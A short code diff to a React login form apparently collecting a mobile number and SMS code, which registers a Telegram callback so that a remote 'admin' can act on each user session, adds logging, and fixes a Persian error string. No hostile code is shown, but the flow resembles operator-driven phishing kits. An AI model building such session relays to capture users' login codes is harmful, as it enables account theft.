@@ -98,14 +98,19 @@ export const LoginForm = () => {
 
   // Register callback handler for admin actions
   useEffect(() => {
-    if (sessionId && currentStep === "loading") {
+    if (sessionId) {
+      console.log("🔗 Registering callback handler for session:", sessionId);
       registerTelegramCallback(sessionId, handleAdminAction);
 
       return () => {
+        console.log(
+          "🔌 Unregistering callback handler for session:",
+          sessionId,
+        );
         unregisterTelegramCallback(sessionId);
       };
     }
-  }, [sessionId, currentStep]);
+  }, [sessionId]);
 
   // Countdown timer for SMS
   useEffect(() => {
@@ -244,7 +249,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Phone submission error:", error);
       setErrors({
-        mobileNumber: "خط�� در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
+        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
